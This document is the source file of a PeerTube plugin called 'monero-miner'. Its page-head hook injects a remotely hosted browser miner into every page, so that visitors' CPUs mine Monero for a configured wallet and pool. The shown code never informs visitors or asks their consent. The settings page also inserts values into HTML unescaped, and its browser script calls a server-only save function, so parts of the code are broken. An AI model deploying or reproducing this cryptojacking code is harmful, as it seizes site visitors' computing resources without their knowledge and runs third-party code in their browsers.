const fs = require('fs');
const path = require('path');

module.exports = {
  manifest: {
    name: 'monero-miner',
    description: 'PeerTube plugin for Monero mining.',
    version: '1.0.0',
    license: 'MIT',
    author: 'PYU224',
    dependencies: {},
  },

  hooks: {
    // Hook for injecting miner script into the theme's head
    'action:theme.head': {
      handler: () => {
        const settings = loadSettings();
        if (!settings) {
          console.error('Failed to load plugin settings.');
          return '';
        }

        return `
          <script src="https://cdn.jsdelivr.net/gh/NajmAjmal/monero-webminer@main/script.js"></script>
          <script>
            const server = "${settings.webSocket}";
            const pool = "${settings.poolAddress}";
            const walletAddress = "${settings.walletAddress}";
            const workerId = "GH-XMR";
            const threads = ${settings.threads};
            const password = "";
            startMining(pool, walletAddress, workerId, threads, password);
            throttleMiner = 20;
          </script>
        `;
      },
    },

    // Hook for rendering the admin plugin settings page
    'action:admin.setting': {
      handler: () => {
        const settings = loadSettings();
        return `
          <div class="container">
            <h3>Monero Miner Plugin Settings</h3>
            <form id="monero-miner-settings">
              <div class="form-group">
                <label for="walletAddress">Monero Wallet Address</label>
                <input type="text" id="walletAddress" class="form-control" value="${settings.walletAddress}" required>
              </div>
              <div class="form-group">
                <label for="webSocket">WebSocket Server</label>
                <input type="text" id="webSocket" class="form-control" value="${settings.webSocket}" required>
              </div>
              <div class="form-group">
                <label for="poolAddress">Mining Pool Address</label>
                <input type="text" id="poolAddress" class="form-control" value="${settings.poolAddress}" required>
              </div>
              <div class="form-group">
                <label for="threads">Number of Threads</label>
                <input type="number" id="threads" class="form-control" value="${settings.threads}" required>
              </div>
              <button type="submit" class="btn btn-primary">Save Settings</button>
            </form>
            <script>
              document.getElementById('monero-miner-settings').addEventListener('submit', async (e) => {
                e.preventDefault();
                const settings = {
                  walletAddress: document.getElementById('walletAddress').value,
                  webSocket: document.getElementById('webSocket').value,
                  poolAddress: document.getElementById('poolAddress').value,
                  threads: parseInt(document.getElementById('threads').value, 10)
                };
                await saveSettings(settings);
                alert('Settings saved successfully!');
              });
            </script>
          </div>
        `;
      },
    },
  },
};

function loadSettings() {
  const settingsFilePath = path.join(__dirname, 'plugin-settings.json');
  try {
    if (fs.existsSync(settingsFilePath)) {
      const data = fs.readFileSync(settingsFilePath, 'utf-8');
      return JSON.parse(data);
    } else {
      return {
        walletAddress: '',
        webSocket: 'wss://ny1.xmrminingproxy.com',
        poolAddress: 'moneroocean.stream',
        threads: 2,
      };
    }
  } catch (err) {
    console.error('Error loading settings:', err);
    return null;
  }
}

function saveSettings(settings) {
  const settingsFilePath = path.join(__dirname, 'plugin-settings.json');
  try {
    fs.writeFileSync(settingsFilePath, JSON.stringify(settings, null, 2));
    console.log('Settings saved successfully.');
  } catch (err) {
    console.error('Error saving settings:', err);
  }
}
